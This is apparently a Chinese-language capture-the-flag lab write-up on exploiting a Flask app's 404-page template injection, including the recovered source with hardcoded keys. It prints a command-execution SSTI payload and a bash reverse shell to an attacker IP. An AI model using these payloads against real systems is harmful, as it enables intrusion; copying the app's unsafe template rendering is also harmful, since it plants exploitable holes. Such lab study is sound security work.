# 靶场拓扑&情况

# 渗透过程

nmap网络扫描

![](attachments/Pasted%20image%2020230305154310.png)

进入首页康康，有一个蹩脚的login，尝试sql注入，但是没有效果

![](attachments/Pasted%20image%2020230305155954.png)

在url中的值被读取到了页面上

![](attachments/Pasted%20image%2020230305160729.png)

确认是ssti，虽然现在我们可以通过`{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`来实现命令执行，但是想要提权还是要获取到shell才行

![](attachments/Pasted%20image%2020230305164715.png)

发现popen类

![](attachments/Pasted%20image%2020230305163716.png)

这里感觉是一个平时CTF中没有遇到过的玩法拿shell[python中的subprocess.Popen() 执行shell命令 - 技术改变命运Andy - 博客园 (cnblogs.com)](https://www.cnblogs.com/andy0816/p/15624304.html)
`{{''.__class__.__mro__[1].__subclasses__()[373]("bash -c 'bash -i >& /dev/tcp/192.168.163.129/23456 0>&1'",shell=True,stdout=None).communicate()}}`

![](attachments/Pasted%20image%2020230305171206.png)

拿一个源码

```python
from flask import Flask, render_template
import flask, flask_login
from urllib.parse import unquote
from pysqlcipher3 import dbapi2 as sqlcipher


app = Flask(__name__)
app.secret_key = 'RmxhZzF7IEltcG9ydGFudCBmaW5kaW5ncyB9'

pra = "pragma key='SecretssecretsSecrets...'"

try:
  with app.open_resource('static/file/f') as f:
    contents = f.read().decode("utf-8")
except:
    contents = ""    



def check(username):
    con = sqlcipher.connect("static/db2.db")
    con.execute(pra)
    userexists = False
    with con:
                cur = con.cursor()
                cur.execute("SELECT * FROM Users")
                rows = cur.fetchall()
                for row in rows:
                    uname = row[0]
                    if uname==username:
                        userexists=True
    return userexists

def validate(username, password):
    con = sqlcipher.connect("static/db2.db")
    con.execute(pra)
    completion = False
    with con:
                cur = con.cursor()
                cur.execute("SELECT * FROM Users")
                rows = cur.fetchall()
                for row in rows:
                    uname = row[0]
                    pw = row[1]
                    if uname==username:
                        completion=check_password(password, pw)
    return completion

def check_password(hashed_password, user_password):
   
    return hashed_password == user_password
    

login_manager = flask_login.LoginManager()

login_manager.init_app(app)

class User(flask_login.UserMixin):
    pass


@login_manager.user_loader
def user_loader(email):
    
    if check(email) ==False:


        return

    user = User()
    user.id = email
    return user


@login_manager.request_loader
def request_loader(request):
    email = flask.request.form.get('email')
    if not check(email):
   
        return

    user = User()
    user.id = email


    return user



@app.route('/index.html')
@app.route('/')
def index():
     return render_template('index.html')

   
@app.route('/login', methods=['GET', 'POST'])
def login():
    print("Login")
    if flask.request.method == 'POST':
      
        username = flask.request.form['email']
        password = flask.request.form['password']
        completion = validate(username, password)
        if completion == False:
            return render_template('unauth.html')
        else:
             user = User()
             user.id = username
             flask_login.login_user(user)

             return flask.redirect(flask.url_for('protected'))

    
    return render_template('bad.html')
   



@app.route('/protected')
@flask_login.login_required
def protected():
  
    return render_template('protected.html', luser = flask_login.current_user.id, contents=contents )

@app.route('/logout')
def logout():
    flask_login.logout_user()
    return render_template('logout.html')

@login_manager.unauthorized_handler
def unauthorized_handler():
    return render_template('unauth.html')

@app.errorhandler(404)
def not_found(e):
     message = unquote(flask.request.url)
     message =  flask.render_template_string(message)
     return render_template('404.html', dir=dir,
        help=help,
        locals=locals, message=message), 404

@app.errorhandler(500)
def internal_error(error):

    return flask.redirect(flask.url_for('login'))




if __name__ == '__main__':
    app.run()

```

secret_key其实是给flag需要base64解码
`Flag1{ Important findings }`

提权连sudo都没有，在这里卡住了，后面反应过来最开始的页面上有三个人，加上代码中的数据库，感觉是还需要做信息搜集

![](attachments/Pasted%20image%2020230305172148.png)

# 参考链接
[python中的subprocess.Popen() 执行shell命令 - 技术改变命运Andy - 博客园 (cnblogs.com)](https://www.cnblogs.com/andy0816/p/15624304.html)
